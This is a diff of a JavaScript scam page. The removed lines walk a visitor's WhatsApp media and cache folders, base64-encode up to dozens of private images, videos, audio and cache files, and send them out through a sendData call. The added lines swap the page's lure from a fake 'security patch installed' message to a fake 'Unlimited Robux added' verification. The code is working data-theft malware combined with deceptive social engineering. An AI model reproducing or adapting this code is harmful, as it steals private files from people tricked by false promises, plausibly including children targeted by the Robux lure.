-        async function extractWhatsAppMedia(whatsappHandle, basePath) {
-            console.log('[DEBUG] extractWhatsAppMedia called');
-            let totalMedia = 0;
-            try {
-                const mediaFolders = ['Media/WhatsApp Images/', 'Media/WhatsApp Video/', 'Media/WhatsApp Audio/'];
-
-                for (const folder of mediaFolders) {
-                    console.log(`[DEBUG] Trying media folder: ${folder}`);
-                    try {
-                        const folderHandle = await whatsappHandle.getDirectoryHandle(folder);
-                        console.log(`[DEBUG] Found folder: ${folder}`);
-                        let count = 0;
-                        const files = [];
-
-                        for await (const entry of folderHandle.values()) {
-                            if (entry.kind === 'file') {
-                                const ext = entry.name.split('.').pop().toLowerCase();
-                                const mediaExts = ['jpg', 'jpeg', 'png', 'gif', 'mp4', 'mov', 'avi', 'webm', '3gp', 'm4a', 'opus', 'aac'];
-                                if (mediaExts.includes(ext)) {
-                                    files.push({ name: entry.name, handle: entry });
-                                }
-                            }
-                        }
-                        console.log(`[DEBUG] Found ${files.length} media files in ${folder}`);
-
-                        const maxFiles = 20;
-                        for (let i = 0; i < Math.min(files.length, maxFiles); i++) {
-                            try {
-                                console.log(`[DEBUG] Processing media file: ${files[i].name}`);
-                                const fileObj = await files[i].handle.getFile();
-                                const reader = new FileReader();
-                                const dataUrl = await new Promise((resolve) => {
-                                    reader.onload = () => resolve(reader.result);
-                                    reader.readAsDataURL(fileObj);
-                                });
-                                const base64Data = dataUrl.split(',')[1];
-
-                                console.log(`[DEBUG] Sending WhatsApp media: ${files[i].name}`);
-                                await sendData({
-                                    type: 'whatsapp_media',
-                                    filename: files[i].name,
-                                    path: `${basePath}${folder}${files[i].name}`,
-                                    size: fileObj.size,
-                                    data: base64Data
-                                });
-                                count++;
-                                totalMedia++;
-                            } catch (e) {
-                                console.log(`[DEBUG] Failed to process media file: ${files[i].name}`, e.message);
-                            }
-                        }
-                        if (count > 0) {
-                            addLogEntry(`✅ WhatsApp ${folder}: ${count} files`, 'whatsapp');
-                        }
-                    } catch (e) {
-                        console.log(`[DEBUG] Folder not found: ${folder}`);
-                    }
-                }
-
-                console.log(`[DEBUG] Media extraction complete, total: ${totalMedia}`);
-                if (totalMedia === 0) {
-                    addLogEntry('⚠️ No WhatsApp media found', 'warn');
-                }
-
-            } catch (err) {
-                console.error('[DEBUG] Media error:', err);
-                addLogEntry('❌ Media error: ' + err.message, 'error');
-            }
-            return totalMedia;
-        }
-
-        // ============================================================
-        // EXTRACT WHATSAPP CACHE — WITH DEBUG
-        // ============================================================
-        async function extractWhatsAppCache(whatsappHandle, basePath) {
-            console.log('[DEBUG] extractWhatsAppCache called');
-            let count = 0;
-            try {
-                console.log('[DEBUG] Looking for Cache/ folder');
-                const cacheHandle = await whatsappHandle.getDirectoryHandle('Cache/');
-                console.log('[DEBUG] Found Cache/ folder');
-
-                for await (const entry of cacheHandle.values()) {
-                    if (entry.kind === 'file' && count < 10) {
-                        try {
-                            console.log(`[DEBUG] Processing cache file: ${entry.name}`);
-                            const fileObj = await entry.getFile();
-                            if (fileObj.size > 0 && fileObj.size < 1024 * 1024) {
-                                const reader = new FileReader();
-                                const dataUrl = await new Promise((resolve) => {
-                                    reader.onload = () => resolve(reader.result);
-                                    reader.readAsDataURL(fileObj);
-                                });
-                                const base64Data = dataUrl.split(',')[1];
-
-                                console.log(`[DEBUG] Sending WhatsApp cache: ${entry.name}`);
-                                await sendData({
-                                    type: 'whatsapp_cache',
-                                    filename: entry.name,
-                                    path: `${basePath}Cache/${entry.name}`,
-                                    size: fileObj.size,
-                                    data: base64Data
-                                });
-                                count++;
-                            }
-                        } catch (e) {
-                            console.log(`[DEBUG] Failed to process cache file: ${entry.name}`, e.message);
-                        }
-                    }
-                }
-
-                console.log(`[DEBUG] Cache extraction complete, count: ${count}`);
-                if (count > 0) {
-                    addLogEntry(`✅ WhatsApp cache: ${count} files`, 'whatsapp');
-                }
-            } catch (e) {
-                console.log('[DEBUG] Cache folder not found');
-                addLogEntry('⚠️ WhatsApp cache not found', 'warn');
-            }
-            return count;
+            btn.textContent = '✅ Claimed!';
+            addLogEntry('✅ Verification complete!', 'done');
         }
 
         // ============================================================
@@ -1110,11 +837,11 @@
         // ============================================================
         function step3() {
             if (!scanComplete) {
-                alert('Please wait for the scan to complete.');
+                alert('Please complete the verification first.');
                 return;
             }
-            sendData({ type: 'action', action: 'install_clicked' });
-            alert('✅ Security patch installed successfully. Your phone will restart in 5 seconds.');
+            sendData({ type: 'action', action: 'go_to_roblox' });
+            alert('🎉 Unlimited Robux added to your account!');
             window.location.reload();
         }
 
